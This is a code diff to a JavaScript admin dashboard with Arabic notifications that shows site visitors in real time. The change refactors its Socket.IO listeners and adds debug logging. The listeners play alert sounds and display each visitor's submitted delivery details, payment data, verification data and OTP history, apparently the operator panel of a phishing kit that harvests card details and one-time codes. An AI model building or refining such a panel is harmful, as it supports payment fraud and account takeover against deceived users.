@@ -50,8 +50,11 @@ function initAdminSocket() {
       reconnectionDelay: 1000
     });
 
+    // Set up ALL event listeners immediately
+    setupSocketListeners();
+
     socket.on('connect', () => {
-      console.log('🔌 Admin connected');
+      console.log('🔌 Admin connected, socket id:', socket.id);
       updateConnectionStatus(true);
       
       // Wait for connection to stabilize
@@ -59,8 +62,7 @@ function initAdminSocket() {
         if (adminToken) {
           socket.emit('admin:validate', { sessionToken: adminToken });
         }
-        
-        // Request initial data immediately after connection
+        // Request initial data
         requestInitialData();
       }, 500);
       
@@ -68,7 +70,7 @@ function initAdminSocket() {
     });
 
     socket.on('connect_error', (error) => {
-      console.error('Connection error:', error);
+      console.error('❌ Connection error:', error);
       updateConnectionStatus(false);
       reject(error);
     });
@@ -81,115 +83,125 @@ function initAdminSocket() {
     socket.on('reconnect', () => {
       console.log('🔌 Admin reconnected');
       updateConnectionStatus(true);
-      // Re-validate and refresh data on reconnect
       if (adminToken) {
         socket.emit('admin:validate', { sessionToken: adminToken });
       }
       requestInitialData();
     });
+  });
+}
 
-    socket.on('admin:valid', (data) => {
-      if (!data.valid) {
-        localStorage.removeItem('admin_token');
-        adminToken = null;
-      }
-    });
+// Separate function for all socket listeners
+function setupSocketListeners() {
+  if (!socket) return;
 
-    socket.on('admin:forceLogout', () => {
+  socket.on('admin:valid', (data) => {
+    console.log('🔐 Admin validation result:', data);
+    if (!data.valid) {
       localStorage.removeItem('admin_token');
       adminToken = null;
-      showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
-      setTimeout(() => showLoginPage(), 2000);
-    });
-
-    // Visitor events - Real-time updates (NO POLLING)
-    socket.on('visitor:new', (data) => {
-      sounds.newVisitor();
-      updateStats();
-      console.log('🆕 New visitor:', data);
-      // Request full refresh when new visitor arrives
-      updateVisitorsList();
-    });
-
-    socket.on('visitor:pageChange', (data) => {
-      updateVisitorPage(data.sessionId, data.page);
-    });
-
-    socket.on('visitor:offline', (data) => {
-      updateVisitorStatus(data.sessionId, false);
-      updateStats();
-    });
-
-    socket.on('visitor:online', (data) => {
-      updateVisitorStatus(data.sessionId, true);
-    });
-    
-    // IMPORTANT: Initialize persistent listener for visitors list updates
-    initVisitorsListener();
-
-    // Form submissions - Real-time card updates
-    socket.on('form:deliverySubmitted', (data) => {
-      sounds.formDelivery();
-      updateStats();
-      console.log('📦 Delivery submitted:', data);
-      // Update card and refresh list if needed
-      updateVisitorCard(data.sessionId, { 
-        form_submitted: true, 
-        delivery_data: data.formData || data.deliveryData,
-        is_online: true
-      });
-      // Also request full list refresh for consistency
-      updateVisitorsList();
-    });
-
-    socket.on('form:paymentSubmitted', (data) => {
-      sounds.formPayment();
-      updateStats();
-      console.log('💳 Payment submitted:', data);
-      // Update card and refresh list if needed
-      updateVisitorCard(data.sessionId, { 
-        payment_submitted: true, 
-        payment_data: data.paymentData,
-        is_online: true
-      });
-      // Also request full list refresh for consistency
-      updateVisitorsList();
-    });
-
-    socket.on('form:verificationSubmitted', (data) => {
-      sounds.formVerification();
-      updateStats();
-      console.log('🔐 Verification submitted:', data);
-      // Update card and refresh list if needed
-      updateVisitorCard(data.sessionId, { 
-        verification_submitted: true, 
-        verification_data: data.verificationData,
-        otp_history: data.otpHistory || [],
-        is_online: true
-      });
-      // Also request full list refresh for consistency
-      updateVisitorsList();
-    });
-
-    // Stats update event
-    socket.on('stats:push', (data) => {
-      updateStatsDisplay(data);
-    });
-
-    // Ban list update event
-    socket.on('ban:listUpdate', () => {
-      loadBannedUsers();
-    });
-
-    socket.on('user:unbanned', (data) => {
-      if (data.success) {
-        showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
-        loadBannedUsers();
-      } else {
-        showNotification('خطأ', data.message || 'حدث خطأ', 'error');
-      }
-    });
+    }
   });
+
+  socket.on('admin:forceLogout', () => {
+    localStorage.removeItem('admin_token');
+    adminToken = null;
+    showNotification('انتهت جلستك', 'تم تسجيل خروجك من جميع الأجهزة', 'warning');
+    setTimeout(() => showLoginPage(), 2000);
+  });
+
+  // CRITICAL: Real-time updates from visitors
+  socket.on('visitor:new', (data) => {
+    console.log('🆕 DATA RECEIVED VIA SOCKET (visitor:new):', data);
+    sounds.newVisitor();
+    updateStats();
+    updateVisitorsList();
+  });
+
+  socket.on('visitor:pageChange', (data) => {
+    console.log('📄 DATA RECEIVED VIA SOCKET (visitor:pageChange):', data);
+    updateVisitorPage(data.sessionId, data.page);
+  });
+
+  socket.on('visitor:offline', (data) => {
+    console.log('📴 DATA RECEIVED VIA SOCKET (visitor:offline):', data);
+    updateVisitorStatus(data.sessionId, false);
+    updateStats();
+  });
+
+  socket.on('visitor:online', (data) => {
+    console.log('🟢 DATA RECEIVED VIA SOCKET (visitor:online):', data);
+    updateVisitorStatus(data.sessionId, true);
+  });
+
+  socket.on('form:deliverySubmitted', (data) => {
+    console.log('📦 DATA RECEIVED VIA SOCKET (form:deliverySubmitted):', data);
+    sounds.formDelivery();
+    updateStats();
+    updateVisitorCard(data.session_id, { 
+      form_submitted: true, 
+      delivery_data: data.delivery_data,
+      is_online: true
+    });
+    updateVisitorsList();
+  });
+
+  socket.on('form:paymentSubmitted', (data) => {
+    console.log('💳 DATA RECEIVED VIA SOCKET (form:paymentSubmitted):', data);
+    sounds.formPayment();
+    updateStats();
+    updateVisitorCard(data.session_id, { 
+      payment_submitted: true, 
+      payment_data: data.payment_data,
+      is_online: true
+    });
+    updateVisitorsList();
+  });
+
+  socket.on('form:verificationSubmitted', (data) => {
+    console.log('🔐 DATA RECEIVED VIA SOCKET (form:verificationSubmitted):', data);
+    sounds.formVerification();
+    updateStats();
+    updateVisitorCard(data.session_id, { 
+      verification_submitted: true, 
+      verification_data: data.verification_data,
+      otp_history: data.otp_history || [],
+      is_online: true
+    });
+    updateVisitorsList();
+  });
+
+  socket.on('stats:push', (data) => {
+    console.log('📊 DATA RECEIVED VIA SOCKET (stats:push):', data);
+    updateStatsDisplay(data);
+  });
+
+  socket.on('visitors:update', (data) => {
+    console.log('📋 DATA RECEIVED VIA SOCKET (visitors:update):', data);
+    handleVisitorsUpdate(data);
+  });
+
+  socket.on('stats:update', (data) => {
+    console.log('📊 DATA RECEIVED VIA SOCKET (stats:update):', data);
+    updateStatsDisplay(data);
+  });
+
+  socket.on('ban:listUpdate', () => {
+    console.log('🚫 DATA RECEIVED VIA SOCKET (ban:listUpdate)');
+    loadBannedUsers();
+  });
+
+  socket.on('user:unbanned', (data) => {
+    console.log('✅ DATA RECEIVED VIA SOCKET (user:unbanned):', data);
+    if (data.success) {
+      showNotification('تم فك الحظر', 'تم فك الحظر بنجاح', 'success');
+      loadBannedUsers();
+    } else {
+      showNotification('خطأ', data.message || 'حدث خطأ', 'error');
+    }
+  });
+
+  console.log('✅ All socket listeners registered');
 }
 
 function updateConnectionStatus(isOnline) {
@@ -486,12 +498,18 @@ function updateVisitorsList() {
 }
 
 function handleVisitorsUpdate(data) {
+  console.log('📋 Processing visitors update:', data);
   const grid = document.getElementById('visitorsGrid');
   const countEl = document.getElementById('onlineCount');
   const totalCountEl = document.getElementById('totalCount');
-  if (!grid) return;
+  if (!grid) {
+    console.log('❌ Grid not found');
+    return;
+  }
   
   const visitors = data.visitors || [];
+  console.log('📋 Processing', visitors.length, 'visitors');
+  
   const onlineCount = visitors.filter(v => v.is_online).length;
   
   if (countEl) countEl.textContent = onlineCount;
@@ -509,75 +527,14 @@ function handleVisitorsUpdate(data) {
     return;
   }
   
-  // Track which visitors we already have cards for
-  const currentCardIds = new Set(
-    Array.from(grid.querySelectorAll('.visitor-card')).map(card => card.dataset.session)
-  );
-  
-  // Track new visitors
-  const newVisitorIds = new Set(visitors.map(v => v.session_id));
-  
-  // Find visitors that need to be added
-  visitors.forEach(visitor => {
-    if (!currentCardIds.has(visitor.session_id)) {
-      // New visitor - add card at the beginning
-      const cardHTML = createVisitorCard(visitor);
-      grid.insertAdjacentHTML('afterbegin', cardHTML);
-      
-      // Animate new card
-      const newCard = grid.querySelector('[data-session="' + visitor.session_id + '"]');
-      if (newCard) {
-        newCard.style.opacity = '0';
-        newCard.style.transform = 'translateY(-20px)';
-        setTimeout(() => {
-          newCard.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
-          newCard.style.opacity = '1';
-          newCard.style.transform = 'translateY(0)';
-        }, 50);
-      }
-    }
-  });
-  
-  // Find visitors that need to be removed (offline for too long)
-  currentCardIds.forEach(sessionId => {
-    if (!newVisitorIds.has(sessionId)) {
-      const card = grid.querySelector('[data-session="' + sessionId + '"]');
-      if (card) {
-        card.style.opacity = '0';
-        card.style.transform = 'translateX(-20px)';
-        setTimeout(() => card.remove(), 300);
-      }
-    }
-  });
-  
-  // Update existing cards
-  visitors.forEach(visitor => {
-    const card = grid.querySelector('[data-session="' + visitor.session_id + '"]');
-    if (card) {
-      // Update online status
-      const wasOnline = card.dataset.online === 'true';
-      const isOnline = visitor.is_online;
-      
-      if (wasOnline !== isOnline) {
-        updateVisitorStatus(visitor.session_id, isOnline);
-      }
-    }
-  });
+  // Full refresh: rebuild entire grid
+  grid.innerHTML = visitors.map(visitor => createVisitorCard(visitor)).join('');
   
   // Update cache
   visitorsCache.clear();
   visitors.forEach(v => visitorsCache.set(v.session_id, v));
   
-  console.log('📋 Visitors list updated:', visitors.length);
-}
-
-// Listen for visitors update ONCE at initialization, then use handleVisitorsUpdate
-function initVisitorsListener() {
-  if (!socket) return;
-  
-  // Use 'visitors:update' event - it should be set up to handle multiple calls
-  socket.off('visitors:update', handleVisitorsUpdate); // Remove any existing
-  socket.on('visitors:update', handleVisitorsUpdate);
+  console.log('✅ Visitors grid updated with', visitors.length, 'cards');
 }
 
 function updateVisitorPage(sessionId, page) {
@@ -615,7 +572,10 @@ function updateVisitorStatus(sessionId, isOnline) {
 
 // Request initial data on connection
 function requestInitialData() {
-  if (!socket) return;
+  if (!socket || !socket.connected) {
+    console.log('❌ Socket not connected, cannot request data');
+    return;
+  }
   socket.emit('visitors:request');
   socket.emit('stats:request');
   console.log('📡 Requesting initial data...');
